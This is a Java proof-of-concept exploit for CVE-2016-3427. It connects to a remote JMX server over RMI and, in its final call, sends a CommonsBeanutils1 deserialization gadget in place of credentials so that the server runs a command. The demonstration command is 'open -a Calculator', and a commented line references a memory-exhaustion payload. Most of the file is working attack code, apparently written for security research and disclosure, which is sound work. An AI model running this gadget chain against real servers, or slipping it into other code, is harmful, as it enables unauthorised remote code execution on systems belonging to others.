package com.salesforce.trust.s11n.exploit;

import com.salesforce.trust.s11n.payload.CommonsBeanutils1;

import java.io.IOException;
import java.net.MalformedURLException;
import java.rmi.NotBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnection;
import javax.management.remote.rmi.RMIServer;
import javax.naming.NamingException;


/**
 * POC for CVE-2016-3427
 * 
 * This application tries to connect to a remote JMX server.
 * 
 * 1. Using the usual 'long' connection string
 * 
 * 2. Directly using the RMI connection string
 * 
 * 3. Similar to 2., but instead of sending String[]{'user','pwd'} we send
 * arbitrary object (JRE 8u77 or earlier)
 * 
 * @author Pierre Ernst
 *
 */
public class JmxClient {

	/**
	 * Connects to the remote JMX server using the prescribed way
	 * 
	 * @param hostName
	 *            JMX server
	 * @param registryPort
	 *            JNDI registry port on the JMX server
	 * @param jmxPort
	 *            JMX port on the JMX server
	 * @param credentials
	 *            JMX credentials (username / password)
	 * @throws MalformedURLException
	 * @throws IOException
	 */
	private static void connectWithJmxUrl(String hostName, int registryPort, int jmxPort, String[] credentials)
			throws MalformedURLException, IOException {
		String url = "service:jmx:rmi://" + hostName + ":" + jmxPort + "/jndi/rmi://" + hostName + ":" + registryPort
				+ "/jmxrmi";
		System.out.println("Trying to connect to " + url + " ...");

		Map<String, String[]> props = new HashMap<>();
		props.put(JMXConnector.CREDENTIALS, credentials);
		JMXConnector connector = JMXConnectorFactory.connect(new JMXServiceURL(url), props);
		System.out.println("Connected: " + connector.getConnectionId());
		System.out.println();
		connector.close();
	}

	/**
	 * Connects to the remote JMX server using the RMI shortcut
	 * 
	 * @param hostName
	 *            JMX server
	 * @param registryPort
	 *            JNDI registry port on the JMX server
	 * @param credentials
	 *            JMX credentials, expected to be (username / password)
	 * @throws IOException
	 * @throws NamingException
	 * @throws NotBoundException
	 */
	private static void connectWithRmiUrl(String hostName, int registryPort, Object credentials)
			throws IOException, NamingException, NotBoundException {
		String url = "jmxrmi";
		System.out.println("Trying to connect to '" + url + "' on JNDI registry " + hostName + ":" + registryPort
				+ " using credentials of type " + credentials.getClass().getName() + " ...");

		Registry registry = LocateRegistry.getRegistry(hostName, registryPort);
		RMIServer rmiServer = (RMIServer) registry.lookup("jmxrmi");
		RMIConnection rmiConnection = rmiServer.newClient(credentials);
		System.out.println("Connected: " + rmiConnection.getConnectionId());
		System.out.println();
		rmiConnection.close();
	}

	public static void main(String... args) {
		try {

			if (args.length != 4) {
				System.err.println(
						"Usage: java " + JmxClient.class.getName() + " hostName registryPort jmxPort userName");
			} else {
				int registryPort = Integer.parseInt(args[1]);
				int jmxPort = Integer.parseInt(args[2]);

				System.out.print("Enter password: ");
				String password = "adsfasdf";
//				String password = new String(System.console().readPassword());
				System.out.println();

				String[] credentials = new String[] { args[3], password };

				connectWithJmxUrl(args[0], registryPort, jmxPort, credentials);

				connectWithRmiUrl(args[0], registryPort, credentials);

//				connectWithRmiUrl(args[0], registryPort, JreOutOfMemory.getMaliciousSerializable());

				connectWithRmiUrl(args[0], registryPort, new CommonsBeanutils1().getObject("open -a Calculator"));

			}
		} catch (NumberFormatException ex) {
			System.err.println("Usage: java " + JmxClient.class.getName() + " hostName registryPort jmxPort userName");
		} catch (Exception ex) {
			ex.printStackTrace(System.err);
		}
	}
}
